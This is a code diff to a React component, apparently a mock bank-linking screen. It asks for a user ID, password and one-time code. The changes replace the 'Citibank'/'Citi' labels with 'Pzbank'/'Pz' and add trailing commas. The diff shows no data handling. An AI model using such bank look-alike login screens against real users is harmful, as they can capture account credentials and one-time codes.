@@ -64,11 +64,11 @@ const CitiBank = ({
         transition={{ type: "spring", stiffness: 300, damping: 50 }}
         className={clsx(
           "w-full min-h-screen h-full  top-0  bg-white",
-          typeAccount ? "hidden" : "block"
+          typeAccount ? "hidden" : "block",
         )}
       >
         <BankingHeader
-          text="oAuth Sign On - Citibank"
+          text="oAuth Sign On - Pzbank"
           handleCancel={handleCancel}
           img={CitiFavIcon}
           setAllBankItems={setAllBankItems}
@@ -94,14 +94,14 @@ const CitiBank = ({
           <div
             className={clsx(
               "w-full customMiniTablet:w-[350px] ",
-              allBankOpen ? "hidden" : "block"
+              allBankOpen ? "hidden" : "block",
             )}
           >
             <div className="flex justify-center mb-8 text-customBlue-500">
               <MdOutlineLockPerson size={100} />
             </div>
             <h2 className="text-xl font-medium text-center mb-7">
-              Sign on to Citi
+              Sign on to Pz
             </h2>
             <div>
               <div className="mb-3">
@@ -114,7 +114,9 @@ const CitiBank = ({
                   placeholder="User ID"
                   className={clsx(
                     "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
-                    errorFormState.username ? "border border-customRed-100" : ""
+                    errorFormState.username
+                      ? "border border-customRed-100"
+                      : "",
                   )}
                 />
                 {errorFormState.username && (
@@ -133,7 +135,9 @@ const CitiBank = ({
                   placeholder="password"
                   className={clsx(
                     "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
-                    errorFormState.password ? "border border-customRed-100" : ""
+                    errorFormState.password
+                      ? "border border-customRed-100"
+                      : "",
                   )}
                 />
                 {errorFormState.password && (
@@ -198,7 +202,7 @@ const CitiBank = ({
                           <MdOutlineLockPerson size={100} />
                         </div>
                         <h2 className="text-xl font-medium text-center mb-7">
-                          Sign on to Citi
+                          Sign on to Pz
                         </h2>
                         <div>
                           <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
@@ -216,7 +220,7 @@ const CitiBank = ({
                                 "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
                                 errorFormState.username
                                   ? "border border-customRed-100"
-                                  : ""
+                                  : "",
                               )}
                             />
                             {errorFormState.username && (
@@ -237,7 +241,7 @@ const CitiBank = ({
                                 "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
                                 errorFormState.password
                                   ? "border border-customRed-100"
-                                  : ""
+                                  : "",
                               )}
                             />
                             {errorFormState.password && (
@@ -289,7 +293,7 @@ const CitiBank = ({
                       <div
                         className={clsx(
                           " customMiniTablet:w-[500px] px-4  py-4",
-                          isOpenOtp && "hidden"
+                          isOpenOtp && "hidden",
                         )}
                       >
                         <div>
@@ -330,7 +334,7 @@ const CitiBank = ({
                                           "rounded-full w-[10px] h-[10px]  ",
                                           otpOptions[indexOtp]?.id === bank.id
                                             ? "bg-customBlue-500"
-                                            : ""
+                                            : "",
                                         )}
                                       ></p>
                                     </div>
@@ -339,7 +343,7 @@ const CitiBank = ({
                                         "text-sm",
                                         otpOptions[indexOtp]?.id === bank.id
                                           ? "text-customBlue-500 hover:underline"
-                                          : "hover:text-customBlue-700 hover:underline"
+                                          : "hover:text-customBlue-700 hover:underline",
                                       )}
                                     >
                                       {bank.name}
@@ -360,7 +364,7 @@ const CitiBank = ({
                       {isOpenOtp && (
                         <div
                           className={clsx(
-                            " customMiniTablet:w-[500px] px-4  py-4"
+                            " customMiniTablet:w-[500px] px-4  py-4",
                           )}
                         >
                           <div>
@@ -387,7 +391,7 @@ const CitiBank = ({
                                         "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic no-spinner border-customGray-600",
                                         errorOtp.otpo
                                           ? "border border-customRed-100"
-                                          : ""
+                                          : "",
                                       )}
                                     />
                                     {errorOtp.otpo && (
@@ -412,7 +416,7 @@ const CitiBank = ({
                                   className={clsx(
                                     "cursor-pointer text-customBlue-100 font-bold text-center",
                                     !resend &&
-                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed"
+                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed",
                                   )}
                                   onClick={handleResend}
                                 >
@@ -446,7 +450,7 @@ const CitiBank = ({
                     <>
                       <div
                         className={clsx(
-                          " customMiniTablet:w-[500px] px-4  py-4"
+                          " customMiniTablet:w-[500px] px-4  py-4",
                         )}
                       >
                         <div>
@@ -473,7 +477,7 @@ const CitiBank = ({
                                       "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic no-spinner border-customGray-600",
                                       errorOtp.otpo
                                         ? "border border-customRed-100"
-                                        : ""
+                                        : "",
                                     )}
                                   />
                                   {errorOtp.otpo && (
@@ -501,7 +505,7 @@ const CitiBank = ({
                                 className={clsx(
                                   "cursor-pointer text-customBlue-100 font-bold text-center",
                                   !resend &&
-                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
+                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed",
                                 )}
                                 onClick={handleResend}
                               >
